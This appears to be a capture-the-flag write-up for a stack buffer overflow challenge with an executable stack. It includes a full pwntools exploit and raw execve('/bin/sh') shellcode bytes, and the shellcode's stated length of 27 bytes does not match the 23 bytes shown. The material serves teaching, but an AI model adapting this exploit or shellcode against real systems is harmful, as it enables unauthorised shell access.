# Challenge 04: Shellcode Execution

## Difficulty: Easy-Medium

## Vulnerability Type: Stack Buffer Overflow + Shellcode Execution

## Description
Classic shellcode challenge where the stack is executable (NX disabled). You need to inject and execute shellcode.

## Protections
- **NX**: Disabled (stack is executable!)
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Executable Stack
```c
mprotect(stack_page, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
```
The program explicitly makes the stack executable.

### Address Leak
```c
printf("Buffer is at: %p\n", buffer);
```
The program leaks the buffer address where our shellcode will be.

### Buffer Overflow
```c
read(0, buffer, 512);  // 256-byte buffer
```

## Exploitation Strategy

### Step 1: Get Buffer Address
```python
p.recvuntil(b'at: ')
buffer_addr = int(p.recvline().strip(), 16)
```

### Step 2: Create Shellcode
```python
# x64 execve("/bin/sh", NULL, NULL) shellcode
shellcode = asm(shellcraft.sh())
# Or use pre-made shellcode
```

### Step 3: Build Payload
```python
offset = 264  # Buffer + saved RBP
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(buffer_addr)  # Return to start of buffer
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./challenge')

if args.REMOTE:
    p = remote('localhost', 9004)
else:
    p = process('./challenge')

# Get buffer address
p.recvuntil(b'at: ')
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"Buffer at: {hex(buffer_addr)}")

# Create shellcode
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode length: {len(shellcode)}")

# Build payload
offset = 264
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(buffer_addr)

p.sendafter(b'shellcode: ', payload)
p.interactive()
```

### Example Shellcode (Manual)
```python
# 27-byte execve shellcode
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
shellcode += b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

## Automated Detection
- **Executable Stack**: Detected via checksec (NX disabled)
- **Address Leak**: Program prints buffer address
- **Buffer Overflow**: Standard overflow
- **Strategy**: Inject shellcode + return to buffer address

## Learning Objectives
- Shellcode writing/usage
- NX protection understanding
- Address calculation
- Difference between executable and non-executable stacks

## Modern Context
This challenge is rare in modern binaries due to NX bit being standard. However, it teaches fundamental concepts about code injection.
